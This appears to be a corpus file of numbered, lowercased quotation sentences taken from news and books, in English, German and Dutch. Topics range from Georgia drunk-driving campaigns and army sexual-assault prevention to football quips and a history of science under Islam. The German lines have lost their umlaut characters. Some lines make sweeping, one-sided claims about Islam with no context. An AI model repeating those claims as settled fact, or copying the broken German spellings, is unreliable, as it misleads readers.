8605724 this deadly amethyst initiative also ignores the fact that many georgia teens turn 18 while still in high school and most dont go to college
8605725 that simply pushes responsibility for handling the underage drinking problem down to high school teachers and principals and parents of students still at home
8605726 many of our colleges have been at the forefront of combating underage drinking by establishing curriculums to help change the student drinking culture tightening alcohol policies on campus and promoting responsible beverage sales in their communities
8605727 these approaches combined with effective enforcement have reduced impaired driving and related crashes and injuries on our roadways
8605728 many seniors disabled veterans and others with disabilities who are not otherwise required to file a tax return are missing out on their stimulus payments
8605729 its the biggest thing to happen to television since its invention
8605730 the transition will affect people using an analog television set with rabbit ears or a rooftop antenna
8605731 most people wont be affected because they get service through cable or satellite
8605732 some cable or satellite subscribers might need additional equipment to be ready for the switch though so check with your service provider
8605733 im used to having a big supply but lately ive had to collect them from our blairsville research station in north georgia
8605734 i consider japanese beetles super bugs but they just cant take it when its dry
8605735 young japanese beetle larvae need moisture to tunnel and search for food
8605736 if they survive in the drought to adulthood they need wet areas to lay their eggs in and there werent many wet areas to be found this summer
8605737 so there arent as many around this year to harm centipede grasses and holly bushes
8605738 and we have a good amount of stressed turf areas in georgia
8605739 we are seeing more cases of anthracnose and dollar spot which are caused by organisms that take advantage of the turfs stressed state
8605740 when theres not sufficient water people tend to reduce or avoid fertilization all together
8605741 they think it will burn the turf if they do but low fertility promotes disease like dollar spot
8605742 generally with less water there is less disease but any plant that is being irrigated can still become diseased
8605743 during drought conditions plants become weak and are more susceptible to infection
8605744 seiridium canker disease is the main cause of tree decline
8605745 drought stress causes the cankers to enlarge about three times faster than they would on nonstressed trees
8605746 other trees and shrubs may be dying as a result of root stress and injury in combination with drought
8605747 a 40 foot tall oak tree died in my neighborhood two weeks ago due to what i believe to be construction injury to the roots combined with the drought
8605748 this funding will allow farmers and ranchers to repair the usually harsh damage to conservation efforts caused by the disaster conditions notably flooding and drought
8605749 usda has worked shoulder to shoulder with producers when weather turns against them and we remain involved to help in the weeks and months of recovery afterward
8605750 young people such as our inductees who work hard to attain academic success deserve to be congratulated
8605751 honoring their achievement provides motivation and encourages them to continue striving toward their goals were proud to include them in the national honor roll
8605752 at georgia southern we dont cheat that costs money and we dont have any
8605753 after you retire theres only one big event left and i aint ready for that
8605754 motivation is simple you eliminate those who are not motivated
8605755 the man who complains about the way the ball bounces is likely to be the one who dropped it

8605757 if my mother put on a helmet and shoulder pads and a uniform that wasnt the same as the one i was wearing id run over her if she was in my way and i love my mother
8605758 winning is not a sometime thing its an all the time thing you dont win once in a while you dont do the right thing once in a while you do them right all the time winning is a habit unfortunately so is losing
8605759 theres nothing that cleanses your soul like getting the h ll kicked out of you
8605760 i dont expect to win enough games to be put on ncaa probation i just want to win enough to warrant an investigation
8605761 in alabama an atheist is someone who doesnt believe in bear bryant
8605762 i remember in pittsburgh we had no players and the ones we did have wanted to stay at the hotel by the fire i was ticked because thats where i wanted to stand
8605763 you can learn more character on the two yard line than anywhere else in life
8605764 its kind of hard to rally around a math class
8605765 i make my practices real hard because if a player is a quitter i want him to quit in practice not in a game
8605766 theres one sure way to keep us from scoring give us the ball near the goal line
8605767 i never graduated from iowa but i was only there for two terms trumans and eisenhowers
8605768 my advice to defensive players take the shortest route to the ball and arrive in a bad humor
8605769 if a contest had 97 prizes the 98th would be a trip to green bay
8605770 i could have been a rhodes scholar except for my grades
8605771 always remember goliath was a 40 point favorite over david
8605772 i asked darrell royal the coach of the texas longhorns why he didnt recruit me and he said well walt we took a look at you and you werent any good
8605773 son youve got a good engine but your hands arent on the steering wheel
8605774 if lessons are learned in defeat our team is getting a great education
8605775 its shattering when player loses interest in camp when you lose your desire to stand around and eat steaks you lose everything
8605776 it isnt necessary to see a good tackle you can hear it
8605777 we didnt tackle well today but we made up for it by not blocking
8605778 three things can happen when you throw the ball and two of them are bad
8605779 ive found that prayers work best when you have big players
8605780 gentlemen it is better to have died a small boy than to fumble the football
8605781 look i would let you go behind the gym and settle this but chances are if hes whipping your butt out here on the field hell probably whip your butt behind the gym
8605782 the members of our steer and heifer team are really coming on strong as they prepare for our fall fair show season
8605783 our exhibitors are doing an excellent job with their steer and heifer projects
8605784 ive got to do more be first nobody can do it as good as me
8605785 ohhhh nooooo bonchon does the chicken right step off kfc
8605786 you drive impaired in georgia you will go to jail informed drivers get handshakes impaired drivers get the handcuffs thats zero tolerance
8605787 too many people dont understand that alcohol drugs and driving just dont mix
8605788 impaired driving is no accident thats why we call them crashes not accidents
8605789 if you see a drunk driver call 911 or gsp also the best protection against an encounter with a drunk driver is still a buckled seat belt moreover if you plan to drink dont drive if you plan to party choose a designated driver before the celebration begins

8605823 we need to talk to russia and to discuss the issue of splinter regions from georgia
8605824 we need to discuss the whole architecture of states around russias western and southern border to avoid committing nato to maintain borders we cannot in practise enforce at an acceptable military cost and to allay russian fears to make russian military action less likely
8605825 we need to see how big the disagreements are and to assess if any other state apart from georgia is in danger of a russian invasion so far the west has not won over enough independent world opinion to strengthen its hand in negotiation with russia
8605826 we need some strategy rather than more foreign policy spin
8605827 didnt you just say that the programme was a bad way to burn 230 000
8605828 holiday weekends often mean increased use of public waterways and that means an increased need for safety awareness from all boaters
8605829 as always conservation rangers will continue to strictly enforce all boating laws in an effort to keep everyone safe but we also encourage people to pay extra attention to others on the water
8605830 boaters should be on the lookout for such obstructions as trees debris and land areas that normally are well under the waters surface
8605831 even if you are familiar with a particular body of water we encourage you to boat with caution to protect your vessel and your occupants

8605857 we dont need to make capitalism more creative we just need governments to stop interfering with it
8605858 weve started the ball rolling on a two year programme which is currently in the early stages of development
8605859 the council has bid through the local transport plan for red light cameras in several locations across the county
8605860 there are about eight sites that have been singled out by the accident investigation priority site list which the council produces every year
8605861 the cameras have to be in places where red light jumping is linked to accidents so there may well be other areas where traffic signal compliance is worse but doesnt cause as many crashes
8605862 jumping red lights is illegal and extremely dangerous and contributes to crashes resulting in death and serious injury
8605863 it is incredibly important that all drivers wait their turn at traffic lights even if the road ahead looks clear it is simply not worth taking the risk
8605864 campaign trail play by play doesnt tell me much more about her platform but she takes the time on her discussion board to elaborate on questions asked during the candidate forums this is a pretty smart move on her part as she can take all the time in the world to refine her answers

8605879 its helping everybody its helping afghanistan its helping the coalition forces and its just a win win for everyone
8605880 one of the first patrols we went on was to go assess this pool
8605881 our contractor didnt want to drain the pool completely when kids are still using it so he was able to set it up so the kids could swim while construction was going on they were working 24 hours a day on the project
8605882 the perfect end state would be that the project becomes self sufficient it doesnt require any american influence to be able to continue
8605883 i dont lose anything if i cut a share from my profits and give it here for my country
8605884 we want the community to have the ability to experience a part of childhood that every kid should have
8605885 i need your help with an issue that is affecting our soldiers sexual assault
8605886 weve been on the defensive concerning this crime and it is a criminal act
8605887 the army was focused on response now were going on the offensive were implementing a new prevention campaign
8605888 as the army moves out front in these efforts i need you to ask yourself and each other what can we do now to prevent sexual assault
8605889 its about bringing the team together being a leader looking out for our fellow soldiers and taking them under your wing to keep them safe
8605890 our army values and the warriors ethos should make it a given
8605891 but to remind you and all our army soldiers i want to reinforce that its your duty as a soldier to
8605892 when you recognize a threat to a fellow soldier i expect you to have the personal courage to intervene and prevent sexual assault as a warrior and a member of a team you must intervene
8605893 as a brother a sister a fellow soldier it is your duty to stand up for your battle buddies no matter the time or place take action do whats right prevent sexual assault act
8605894 we are soldiers motivated to engage and keep our fellow soldiers safe it is our mission to prevent sexual assault and to live the army values and take care of our fellow soldiers we are all motivated to take action to promote sapr programs and become advocates within our communities we are strongest together
8605895 youre here today because youre already actively engaged in your command and communitys efforts to provide better opportunities for soldiers
8605896 i call on you to be an active member of the i am strong program with your support we can proactively combat this crime that is being committed against our soldiers
8605897 sexual assault goes against our army values and warrior ethos
8605898 i need you to intervene before an assault happens have the personal courage to take action and be motivated to make the program a success take ownership
8605899 and were already starting the planning to reset the scenarios and the opfor opposing force so that we can do that
8605900 and so they know how to fight and right now were focused on irregular warfare and a lot of the skills that they have are directly transferable to major conventional operations
8605901 we wont flinch on making sure that our soldiers have the best possible training and equipment to succeed in whatever war we send them into and thats whats happening here every day
8605902 it is very clear to us that the families are stretched
8605903 that the whole force is stretched theres no denying that what were asking of our families is far different than anything that i have seen in my career up to now
8605904 and i think while the next two years will continue to be hard
8605905 and i must admit when i walked down the street the first time the hair stood up on the back of my neck because it was so real
8605906 weve made a quantum advance just in the year plus since ive been here
8605907 from peacetime engagements to major conventional operations and every place in between
8605908 that will allow us to build more brigades which means with more brigades the ones that we have go are deployed less
8605909 and were changing basically what was a cold war army before september 11th to a versatile disciplined force that can operate across the spectrum of conflict in countries
8605910 when i was a divisional commander in germany in 99 to 2001 if you had asked me where i should optimize my training on the spectrum of conflict so i could be the most versatile i would have said if i can do conventional war i can do anything
8605911 after 32 months in iraq i dont believe that mostly the soldiers that have been to iraq and afghanistan dont believe that either theres enough difference some fundamental differences between irregular warfare and major conventional warfare that we need to be more versatile
8605912 first thing they said look general we dont need a bunch of fancy new programs
8605913 we committed ourselves to ratcheting up the level of support that were giving to soldiers and families
8605914 we doubled the amount of money that were putting towards soldier and family programs
8605915 i thank them for their sacrifice and for what theyre doing for this country they are making a difference at a very critical time in our countrys history and they are being successful at it
8605916 and i believe firmly that the efforts were making in iraq and afghanistan are allowing us to deal with the terrorist threat there and not here and its the men and women of the armed forces that are making that possible supported by their families
8605917 youve come here from so many different places having made this journey and feeling in your heart what is right for you to do
8605918 i will now vote happily and enthusiastically for barack obama
8605919 are a shadow are miniscule compared to hillary clinton and john mccain
8605920 if i had been here i would have changed my vote
8605921 connecticut clinton supporters basically felt they had to continue their support for clinton
8605922 i dont know why they felt that to a greater extent than the other states
8605923 i just think that you know our delegates worked hard for both candidates and they felt that hillary clinton deserved some recognition for the wonderful no great job that she has done throughout this campaign
8605924 according to the wishes of those who sent him to denver my duty is to cast that vote for hillary
8605925 every four years the democrats send us another governor we have to get to know
8605926 is why the party that dominates congress has to keep putting up unknowns to contest the worlds most powerful political office
8605927 come to grips at the presidential level with more democratic mystery
8605928 in dozens of interviews his friends said they could not remember his specific views from that era beyond a general emphasis on diversity and social and economic justice
8605929 intentionally kills or attempts to kill the unborn child shall be punished for intentionally killing or attempting to kill a human being
8605930 it seems abortion advocates greatest fear is not of what the fetal homicide bill actually does legally but of how it might encourage people to think about the unborn child
8605931 to support barack obama and second to warm up the crowd for joe biden i love joe biden and america will too
8605932 a perspective that no other american democrat except president carter can offer
8605933 personally approved the transfer to china of advanced space technology that can be used for nuclear combat
8605934 in all likelihood we will be glowing in the dark before we discover the true extent of the clinton decade of betrayal
8605935 a big behind the scenes move wednesday night putting pressure on the typically long winded
8605936 now awaiting sentencing for his part in an 850 000 kickback scheme overseen by barack obama associate tony rezko
8605937 now let me ask you this whose judgment do you trust
8605938 afghanistan and pakistan the real central front in the war on terror
8605939 we will hold russia accountable for its actions and we will help the people of georgia rebuild
8605940 we can call it quits and withdraw from iraq i think that would be a gigantic mistake
8605941 or we can set a deadline for pulling out which i fear will only encourage our enemies to wait us out equally a mistake
8605942 that was 45 percent for gecamines and 55 percent for lundin
8605943 those that bring a feasibility study now we will ask for a majority stake
8605944 if they do nothing we will buy the concession back on our own terms

8605950 she was very insecure and felt like she wasnt pretty
8605951 theres no doubt based on the last two years that she is a highly unstable person

8605963 mit dem 200 millionen euro umfassenden sonderverm gen verbessern wir die wettbewerbsf higkeit der hochschulen und forschungseinrichtungen in rheinland pfalz weiter
8605964 damit stehen den hochschulen und forschungseinrichtungen in den kommenden f nf jahren insgesamt 400 millionen euro ber die sonderprogramme zur verf gung
8605965 damit werden wir den herausforderungen des zuk nftigen fachkr ftebedarfs gerecht
8605966 rheinland pfalz war im letzten jahr das einzige westdeutsche fl chenland das seine verpflichtungen im hochschulpakt erf llt ja sogar deutlich bertroffen hat
8605967 im rahmen des sonderverm gens wird die landesregierung anders als manch anderes land die bundesmittel in voller h he mit zus tzlichen landesmitteln gegenfinanzieren damit wird klar die landesregierung l sst die hochschulen bei der aufnahme zus tzlicher studierender nicht im stich die hochschulen k nnen vielmehr auch in zukunft mit weiter steigenden mittelzuweisungen rechnen
8605968 es sind nicht die kinder welche probleme bereiten es sind die alten welche nie gelernt haben was freude am lernen und lebenslanges lernen bedeutet
8605969 als erster schritt sollten grund und hauptschulen sowie berufliche schulen besser unterst tzt werden wir schlagen vor zuerst an den grund und hauptschu len und im berufsvorbereitungsjahr eine zus tzliche klassen lehrerstunde einzuf hren und den klassenteiler zu senken die lehrerinnen und lehrer brauchen au erdem mehr zeit und professionelle unterst tzung durch schulsozialarbeiter und schulpsychologen
8605970 das kultusministerium hat noch immer nicht auf ein urteil aus dem jahr 2007 reagiert nach dem aufwendungen f r lehrerinnen und lehrer bei klassenfahrten erstattet werden m ssen
8605971 es sind nicht die kinder welche probleme bereiten es sind die alten welche nie gelernt haben was freude am lernen und lebenslanges lernen bedeutet
8605972 damit k nnte die mobilit t von hrk pr sidentin eckpunkte von wissenschaftsrat und dfg zur exzellenzinitiative schaffen gute grundlage f r weitere diskussion
8605973 es sind nicht die kinder welche probleme bereiten es sind die alten welche nie gelernt haben was freude am lernen und lebenslanges lernen bedeutet

8605975 kinder von armen familien werden immer mehr von der bildung abgekoppelt
8605976 eine kostenlose bildung f r alle und zwar vom kindergarten bis zur universit t und das ohne wenn und aber denn dass bildung kostenfrei zu haben ist dass ist eine mogelpackung
8605977 eigentlich ist bildung in deutschland aufgrund der gesetzlichen schulpflicht kostenlos tats chlich jedoch kommen mit der einschulung ihrer kinder erhebliche kosten auf die eltern zu nach unseren berechnungen sind das durchschnittlich einmalige kosten von ca 300 bei der einschulung sowie weitere laufende kosten f r die eltern w hrend des schuljahres die einkommenssituation im elternhaus steht somit im direkten zusammenhang mit den bildungschancen der kinder
8605978 so gibt es nach unseren recherchen eine vollst ndige lernmittelfreiheit nur noch in sechs bundesl ndern
8605979 ist wirklich gesichert dass die entsprechenden verfahren nicht stigmatisierend sind das armut nicht sch ndet
8605980 dies gilt nicht nur f r empf nger innen von transferleistungen wie alg ii gerade familien die knapp ber den berechtigungslimits der jeweiligen unterst tzungsangebote liegen k nnen besonders stark von den benachteiligenden strukturen betroffen sein dies gilt insbesondere wenn es sich um kinderreiche familien handelt
8605981 alle kinder haben ein recht auf gleiche bildungschancen daher fordert der deutsche kinderschutzbund endlich eine chancengerechtigkeit in der bildung f r alle kinder dies hei t z b eine kostenlose bildung von der krippe bis zur ausbildung eine kostenlose betreuung in ganztagsschulen die verpflegung in ganztagsschulen muss f r alle eltern bezahlbar sein und es muss eine vollst ndige lernmittelfreiheit geben
8605982 die regels tze sozialer transferleistungen sind am tats chlichen bedarf von kindern auszurichten hier muss es endlich einen eigenen regelsatz f r kinder geben der kinderzuschlag muss f r alle familien gezahlt werden die arm sind oder in prek ren einkommenssituationen leben
8605983 geringe finanzielle ressourcen von familien und kinderreichtum d rfen sich nicht negativ auf die bildungschancen von kindern auswirken deshalb ist unsere forderungen mehr chancengerechtigkeit
8605984 es sind nicht die kinder welche probleme bereiten es sind die alten welche nie gelernt haben was freude am lernen und lebenslanges lernen bedeutet
8605985 the peter de villiers game plan is all about adding decision making to structure and we are stuck at the moment at decision making

8605995 i was hoping that he would come out later after he saw the fight and say yeah i saw the fight and i lost that fight
8605996 unfortunately for derek it looks like he will be at celtic beyond the transfer window as the club are not receptive to loan deals and thats all thats been offered at the moment
8605997 he was unsatisfied with his performance and i think this is normal
8605998 he must accept you have opponents on the field and not every day is your best day but you cannot lose your face we will talk today you have some rules and we cant accept this
8605999 this is an area we must look at we have a lot of options open and a lot of possibilities at the moment

8606150 william of moerbeke translated at least forty eight treatises including seven on mathematics and mechanics by archimedes translated for the first time into latin grant 1974 39 41 minio paluello 1974 436 438 his aristotelian translations are truly impressive he was the first to translate aristotles biological works from greek into latin in translating the rest of aristotles natural philosophy moerbeke found it useful to revise expand and even complete some earlier translations including revisions of at least three treatises previously translated by james of venice in addition moerbeke translated greek commentaries on aristotles works from late antiquity thus he translated john philoponus commentary on the soul and simplicius one of the earliest beneficiaries of moerbekes translations was thomas aquinas
8606151 with moerbekes monumental contributions all of aristotles natural philosophy was available by the last quarter of the thirteenth century in translations from greek and arabic although many scientific works were translated from arabic to latin in the first half of the twelfth century by such translators as plato of tivoli adelard of bath robert of chester hermann of carinthia dominicus gundissalinus peter alfonso john of seville and others the earliest translations of aristotles works on natural philosophy appear to have occurred in spain in the latter half of the twelfth century by far the most prominent translator of aristotles works on natural philosophy was gerard of cremona c a d 1114 1187 the most prolific translator from arabic to latin of works on science medicine and natural philosophy
8606152 u ntil the end of the sixth century important contributions to natural philosophy were made in the byzantine empire by a number of commentators on the works of aristotle such as alexander of aphrodisias fl 2nd 3rd century a d themistius c a d 317 c 388 simplicius and most important of all the christian neo platonist john philoponus whose ideas were destined to have a large impact on both islamic and latin natural philosophy but the level of achievement was seriously affected in a d 529 when on religious grounds the emperor justinian ordered the closing of platos academy in athens forcing a number of philosophers to depart the byzantine empire and move to the east after that natural philosophy and science played a minor role in byzantine intellectual life this is surprising when we realize that as compared to their contemporary counterparts in islam and the latin west byzantine scholars were truly fortunate because their native language was greek they could read study and interpret without problems of translation all the works available in the greek language that had accumulated in the byzantine empire especially in constantinople since the fifth and fourth centuries b c indeed most of our greek manuscripts come from byzantium
8606153 it is a paradox of history that the civilizations of islam and western europe contributed significantly to the store of human knowledge using translated works and often lacking important earlier texts while the byzantines who had command of the greek language and easy access to the manuscript sources of their great greek predecessors failed to capitalize on their good fortune
8606154 al ghazali included the mathematical sciences within the class of philosophical sciences i e mathematics logic natural science theology or metaphysics politics and ethics and concluded that a student who studied these sciences would be infected with the evil and corruption of the philosophers few there are who devote themselves to this study without being stripped of religion and having the bridle of godly fear removed from their heads watt 1953 34 in his great philosophical work the incoherence of the philosophers al ghazali attacks ancient philosophy especially the views of aristotle he does so by describing and criticizing the ideas of al farabi and avicenna two of the most important islamic philosophical commentators on aristotle after criticizing their opinions on twenty philosophical problems including the eternality of the world that god knows only universals and not particulars and that bodies will not be resurrected after death al ghazali declares all these three theories are in violent opposition to islam to believe in them is to accuse the prophets of falsehood and to consider their teachings as a hypocritical misrepresentation designed to appeal to the masses and this is blatant blasphemy to which no muslim sect would subscribe al ghazali 1963 249
8606155 orthodox islam emerged victorious from the encounter with greek philosophy islam rejected the idea that one could attain truth with unaided human reason and settled for the unreflective comforts of the putatively superior truth of divine revelation wherever one decides to place the date of this victory of orthodox islam perhaps in the ninth century with the conversion of al ashari or in the eleventh century with the works of al ghazali it has been i believe an unmitigated disaster for all muslims indeed all mankind
8606156 o ne must go on jihad i e warlike razzias or raids at least once a year one may use a catapult against them non muslims when they are in a fortress even if among them are women and children one may set fire to them and or drown them if a person of the ahl al kitab people of the book is enslaved his marriage is automatically revoked one may cut down their trees one must destroy their useless books jihadists may take as booty whatever they decide they may steal as much food as they need
8606157 even so enlightened an author as ibn khaldun a d 1332 1406 was hostile to philosophy and philosophers on the basis of his great muqaddimah ibn khaldun is regarded as the first historian to write a world history according to franz rosenthal the muqaddimah was indeed the first large scale attempt to analyze the group relationships that govern human political and social organization on the basis of environmental and psychological factors rosenthal 1973 321 despite his brilliance as an historian ibn khaldun included a chapter in the muqaddimah titled a refutation of philosophy the corruption of the students of philosophy ibn khaldun 1958 3 246 258 in this chapter ibn khaldun condemns the opinions of philosophers as wrong and proclaims to his fellow muslims that the problems of physics are of no importance for us in our religious affairs or our livelihoods therefore we must leave them alone ibn khaldun 1958 3 251 252 he regarded the study of logic as dangerous to the faithful unless they were deeply immersed in the quran and the muslim religious sciences to fortify themselves against its methods
8606158 the muslims desired to learn the sciences of the foreign nations they made them their own through translations they pressed them into the mold of their own views they peeled off these strange tongues and made them pass into their own idiom and surpassed the achievements of the non arabs in them the manuscripts in the non arabic languages were forgotten abandoned and scattered all the sciences came to exist in arabic the systematic works on them were written in arabic writing thus students of the sciences needed a knowledge of the meaning of arabic words and arabic writing they could dispense with all other languages because they had been wiped out and there was no longer any interest in them
8606159 following the translations in the early centuries of islam greek philosophy primarily aristotles received its strongest support from a number of individuals scattered about the islamic world as we have already mentioned al kindi al razi ibn sina and ibn rushd were among the greatest islamic philosophers all were persecuted to some extent case reveals important aspects of intellectual life in islam the first of the islamic commentators on aristotle al kindi was at first favorably received by two caliphs al mamun and al mutassim but his luck ran out with al mutawwakil the sunni caliph mentioned earlier according to pervez hoodbhoy it was not hard for the ulema religious scholars to convince the ruler that the philosopher had very dangerous beliefs mutawwakil soon ordered the confiscation of the scholars personal library but that was not enough the sixty year old muslim philosopher also received fifty lashes before a large crowd which had assembled observers who recorded the event say the crowd roared approval with each stroke hoodbhoy 1991 111 the other four scholars were also subjected to some degree of persecution and a number of them had to flee for their safety
8606160 after the 1240s and for the rest of the middle ages attacks on reason would have been regarded as bizarre and unacceptable
8606161 the madrasas had as their primary mission the teaching of the islamic religion and paid little attention to the foreign sciences which as we saw were comprised of the science and natural philosophy derived ultimately from the greeks the analytical subjects derived from the greeks certainly did not have equal status with religious and theological subjects indeed the foreign sciences played a rather marginal role in the madrasas which formed the core of islamic higher education only those subjects that illuminated the quran or the religious law were taught one such subject was logic which was found useful not only in semantics but was also regarded as helpful in avoiding simple errors of inference the primary function of the madrasas however was to preserve learning and defend orthodoxy mottahedeh 1985 91 in islam most theologians did not regard natural philosophy as a subject helpful to a better understanding of religion on the contrary it was usually viewed as a subject capable of subverting the islamic religion and therefore as potentially dangerous to the faith natural philosophy always remained a peripheral discipline in the lands of islam and was never institutionalized within the educational system as it was in latin christendom
8606162 it is important to point out that not only did university trained theologians fully accept and embrace the discipline of natural philosophy but many if not most of them were eager and active contributors to the literature of natural philosophy it is for that reason that it is wholly appropriate to call them theologian natural philosophers they were equally at home in both disciplines and were keen to import as much natural philosophy as they could into the resolution of theological problems while avoiding any temptations to theologize natural philosophy this explains why some medieval theologians can be equated with the best of the secular natural philosophers such as john buridan and albert of saxony some theologians such as albertus magnus and nicole oresme were clearly superior to them by their actions theologians in the west were full participants in the development and dissemination of natural philosophy they made it possible for the institutionalization of natural philosophy in the universities of the late middle ages and therefore its extensive dissemination nothing like this occurred in the byzantine empire or in islam
8606163 byzantines and muslims paid a heavy price for failing to separate church and state in both societies aristotles natural philosophy was regarded as potentially dangerous because it encompassed ideas and concepts that were hostile to both religions and because it was often felt that scholars who focused too much on natural philosophy would either neglect religion or come to regard it as inferior to natural philosophy islams failure to separate church and state nullified an institutional advantage it had over western christendom where the latter was organized as a centralized hierarchical religion with a single individual the pope holding ultimate power islam was a decentralized religion with no hierarchical structure what power there was derived from local religious leaders who drew on the support of their fellow muslims under these circumstances we might expect that freedom of inquiry and the cultivation of a vibrant sustained natural philosophy would have been more likely to occur within the decentralized muslim religion than within the highly centralized catholic church of western europe as we now know the reverse occurred the west developed a lively natural philosophy whereas in islam natural philosophy became a peripheral and suspect discipline whose study could even prove dangerous
8606164 we should also not underestimate the magnitude of the step taken when it was decided in part following ancient tradition to make the study of philosophy and all aspects of the natural world an official and public enterprise if this seems a mundane achievement it is due to our eurocentrism which forgets that the study of the natural sciences and philosophy was shunned in the islamic colleges of the middle east and that all such inquiries were undertaken in carefully guarded private settings likewise in china there were no autonomous institutions of learning independent of the official bureaucracy the ones that existed were completely at the mercy of the centralized state nor were philosophers given the liberty to define for themselves the realms of learning as occurred in the west
8606165 without the separation of church and state and the developments that proceeded as a consequence the west would not have produced a deeply rooted natural philosophy that was disseminated through europe by virtue of an extensive network of universities which laid the foundation for the great scientific advances made in the sixteenth and seventeenth centuries advances that have continued to the present day
8606166 for a dispassionate examination of the educational backgrounds of major scientists from the fifteenth to the seventeenth century shows that the vast majority of them were in fact university educated as john gascoigne has shown something like 87 of the european scientists born between 1450 and 1650 who were thought worthy of inclusion in the dictionary of scientific biography were university educated more importantly a large proportion of this group was not only university educated but held career posts at a university for the period 1450 1650 this was 45 percent and for 1450 1550 it was 51 percent if one speaks of particular scientists then one must immediately acknowledge that copernicus galileo tycho brahe kepler and newton were all extraordinary products of the apparently procrustean and allegedly scholastic universities of europe in short sociological and historical accounts of the role of the university as an institutional locus for science and as an incubator of scientific thought and argument have been vastly understated
8606167 if spain had persisted as an islamic land into the later centuries say until the time of napoleon it would have retained all the ideological legal and institutional defects of islamic civilization a spain dominated by islamic law would have been unable to found new universities based on the european model of legally autonomous corporate governance as corporations do not exist in islamic law furthermore the islamic model of education rested on the absolute primacy of fiqh of legal studies and the standard of preserving the great traditions of the past this was symbolically reflected in the ijaza the personal authorization to transmit knowledge from the past given by a learned man a tradition quite different from the wests group administered certification through examination of demonstrated learning in the actual event the founding of spanish universities in the thirteenth century first in palencia 1208 9 valladolid salamanca 1227 8 and so on occurred in long established christian areas and the universities were modeled after the constitutions of paris and bologna
8606168 in short the european medievals had fashioned an image of man that was so imbued with reason and rationality that philosophical and theological speculation became breathtaking spheres of inquiry whose outcomes were far from predictable or orthodox to the consternation of all furthermore this theological and philosophical speculation was taking place within the citadels of western learning that is in the universities christian theology had indeed clothed man with a new set of methods and motivations but it had also attributed to him a new set of rational capacities that knew no bounds
8606169 the west in giving in to political correctness and in being corrupted by saudi and other arab money is ceasing to honor the original intent of the university

8606189 we started using virtualization to address power and space issues in our main datacenter we quickly adopted vmware esx as our standard platform for new projects and consolidated existing servers
8606190 it allowed us to continue business as usual and we experienced no delay in completing projects on time today we are way below our power threshold and gained about 50 of our floor space even after we doubled the amount of windows servers
8606191 before going virtual our datacenter power supply was maxed out we couldnt plug in a toaster now with less hardware we have capacity to handle whatever comes our way
8606192 this allowed us to condense many servers is a small amount of space with vmware and ibm bladecenters we were able to consolidate over a 150 servers into one rack

8606268 hes an impact player a difference maker you just kept your fingers crossed that he was going to be able to play but i think in the back of all our minds knowing shawne we know what was in his heart and that he really wanted to play and that any cost possible he was going to find a way to get out there on that field

8606291 apple has an almost teflon like quality its problems dont really seem to matter to consumers
8606292 it is tragic that so many people are dying unnecessarily each year from clostridium difficile
8606293 the vast majority of these deaths could have been avoided if the government had only taken the right action at the right time
8606294 its appalling that the best labour have come up with to tackle this massive problem are gimmicks like gordon browns deep cleaning programme
8606295 we need better antibiotic prescribing and hygiene but also proper isolation facilities in hospitals to stop infections spreading
8606296 these are horrifying statistics there must be zero tolerance of low hygiene standards in hospitals

8606299 there were two players we identified we want to close the robinho deal and that will be the end of our transfer window
8606300 robinho is young so hes the right age and hes come from madrid so he understands what big club football is all about
8606301 robinho comes with real desire and wants to be recognised as one of the best players in the world what were doing is supporting scolari how he wants to change and move the style a bit to take us to the next level therefore were very comfortable that will turn out to be a good investment
8606302 this deal was always going to go to the wire because of the nature of the player and with it being madrid
8606303 we are gaining respect every year and the rest of europe see us as a real club a lot of that has been behind the scenes work were very influential in european football if you look at where we were five years ago it has been a meteoric rise it is about growing up and ultimately you win the champions league and that cements your position
8606304 although weve signed a lot of players this summer weve still got only a 21 man squad really and well lose a lot of that to the internationals next week weve not got players who play for england but so many who go all around the world when these international weeks come up it takes a lot away from our training and preparation
8606305 i am trying to strengthen my squad between now and transfer deadline day with quality players
8606306 am i a fan of james milner he was nearly here two years ago and he nearly signed but i never say anything is done and dusted until it actually happens

8606319 i was a high class muscleman for big business for wall street and for the bankers
8606320 in short i was a racketeer a gangster for capitalism
8606321 i helped make mexico especially tampico safe for american oil interests in 1914 i helped make haiti and cuba a decent place for the national city bank boys to collect revenues in i helped in the raping of half a dozen central american republics for the benefit of wall street the record of racketeering is long i helped purify nicaragua for the international banking house of brown brothers in 1909 1912 i brought light to the dominican republic for american sugar interests in 1916 in china i helped to see to it that standard oil went its way unmolested
8606322 i was contacted by a woman named claudine who became my trainer as an economic hit man
8606323 she said she was sent to help me and to train me
8606324 she is extremely beautiful sensual seductive intelligent her job was to convince me to become an economic hit man holding out these three drugs sex drugs and money and then she wanted to let me know that i was getting into a dirty business and i shouldnt go off on my first assignment which was going to be indonesia and start doing this unless i knew that i was going to continue doing it and once i was in i was in for life
8606325 the system is set up such that the countries are so deep in debt that they cant repay their debt
8606326 when the u s government wants favors from them like votes in the united nations or troops in iraq or in many many cases their resources their oil their canal in the case of panama we go to them and say look you cant pay off your debts therefore sell your oil at a very low price to our oil companies today tremendous pressure is being put on ecuador for example to sell off its amazonian rainforest very precious very fragile places inhabited by indigenous people whose cultures are being destroyed by the oil companies
8606327 at that first meeting the president of the company mentioned some of the books that i had written about indigenous people and said thats nice thats fine keep doing your non profit work
8606328 we approve of that but you certainly would never write about this industry would you and i assured him that i wouldnt

8606342 we are staging a protest because the government has made too many mistakes and has no legitimacy to run the country
8606343 police will use a softened stance to deal with the protesters
8606344 we will give them time to leave the government house but if they continue to defy the court order then we have to use force to drive them out i cannot set the precise time or deadline for this
8606345 if we get arrested please dont follow us to the detention center
8606346 you must remain here and continue fighting if you leave the government house that means we have been defeated

8606353 we are not convinced that the government needs to take any action over the near term
8606354 most managers are taking the position that it would unthinkable to imagine a scenario where the government wouldnt back the debt

8606461 de vloer schuift hier goed en hier trainen leunt dichter aan bij de filosofie van de breakdance
8606462 breakdance is een duursport en lichamelijk misschien wel een van de meest veeleisende sporten
8606463 ik ben met breakdancen begonnen in 2001 uit nieuwsgierigheid omdat mijn neef het deed al gauw bleek dat ik meer talent had en dat ik als ik veel zou trainen wel goed zou worden toen ben ik volop gaan oefenen drie jaar lang daarna had ik voldoende basis
8606464 ik oefen het liefst van al in een stedelijke omgeving als deze met een gladde vloer en veel voorbijgangers
8606465 dat past ook beter in de filosofie van de breakdance die stadsfactor en trouwens ik train helemaal niet zo graag in een sportzaal daar ben ik niet zo goed
